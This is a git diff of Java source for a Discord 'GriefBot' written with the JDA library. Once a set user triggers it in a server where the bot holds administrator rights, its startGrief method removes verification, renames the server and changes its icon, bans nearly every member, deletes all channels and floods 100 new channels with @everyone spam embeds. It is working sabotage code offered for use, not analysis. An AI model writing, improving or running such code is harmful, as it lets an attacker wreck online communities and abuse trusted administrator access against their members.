@@ -2,17 +2,16 @@ package de.corruptedbytes;
 
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
-import java.util.Random;
 
 import de.corruptedbytes.utils.Config;
 import de.corruptedbytes.utils.Shelv;
 import de.corruptedbytes.utils.Utils;
+import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.Permission;
 import net.dv8tion.jda.api.entities.ChannelType;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.Guild.VerificationLevel;
 import net.dv8tion.jda.api.entities.Icon;
-import net.dv8tion.jda.api.entities.Member;
 import net.dv8tion.jda.api.entities.Message;
 import net.dv8tion.jda.api.entities.TextChannel;
 import net.dv8tion.jda.api.entities.User;
@@ -38,7 +37,6 @@ public class GriefBotListener extends ListenerAdapter {
 					&& user.getId().startsWith(GriefBot.getInstance().getGrieferUserID())) {
 				try {
 					if (guild.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
-
 						try {
 							message.delete().queue();
 						} catch (Exception ignored) {
@@ -57,11 +55,20 @@ public class GriefBotListener extends ListenerAdapter {
 	}
 
 	public void startGrief(Guild guild, User user) throws Exception {
-		String name = GriefBot.getInstance().getGriefMessage().replace("%NAME%", user.getName());
+		String name = String.format(GriefBot.getInstance().getGriefMessage(), user.getName());
 		guild.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
 		guild.getManager().setName(name).queue();
-		guild.getManager().setIcon(Icon.from(Config.griefPicture)).queue();
+		guild.getManager().setIcon(Icon.from(Config.GRIEF_PICTURE)).queue();
 
+		guild.getMembers().forEach(member -> {
+			if (member.isOwner() || member.getUser().isBot()
+					|| member.getId() == GriefBot.getInstance().getGrieferUserID()) {
+				return;
+			} else {
+				member.getGuild().ban(member, 0, "bruh").queue();
+			}
+		});
+		
 		guild.getChannels().forEach(key -> {
 			key.delete().queue();
 		});
@@ -71,24 +78,16 @@ public class GriefBotListener extends ListenerAdapter {
 				.complete();
 		base.sendMessage(new String(Base64.getDecoder().decode(Shelv.ASCII_MEME), StandardCharsets.UTF_8)).queue();
 
-		for (Member members : guild.getMembers()) {
-			if (members.isOwner() || members.getUser().isBot()
-					|| members.getId() == GriefBot.getInstance().getGrieferUserID()) {
-				continue;
-			} else {
-				members.getGuild().ban(members.getUser(), 0, "fucked").queue();
-			}
-		}
-
-		int amount = 105;
-
-		for (int i = 0; i < amount; i++) {
+		for (int i = 0; i < 100; i++) {
 			try {
-				TextChannel grief = guild
-						.createTextChannel((name + "-" + new Random().nextInt(amount + 10)).toLowerCase()).complete();
-				grief.sendMessage("> @everyone YOUR DISCORD SERVER WAS GRIEFED!").queue();
-				grief.sendFile(Config.griefPicture).queue();
-				guild.createVoiceChannel((name + "-" + new Random().nextInt(amount + 10)).toUpperCase()).queue();
+				TextChannel grief = guild.createTextChannel(name.toLowerCase()).complete();
+				
+				EmbedBuilder embed = new EmbedBuilder();
+				embed.setThumbnail("attachment://FUCKED.PNG");
+				embed.setTitle(GriefBot.getInstance().getSpamMessage());
+				embed.setDescription("**" + GriefBot.getInstance().getSpamMessage() + "**");
+				embed.setFooter(name);
+				grief.sendMessage("@everyone").addFile(Config.GRIEF_PICTURE, "FUCKED.PNG").embed(embed.build()).queue();
 			} catch (Exception ignored) {
 			}
 		}
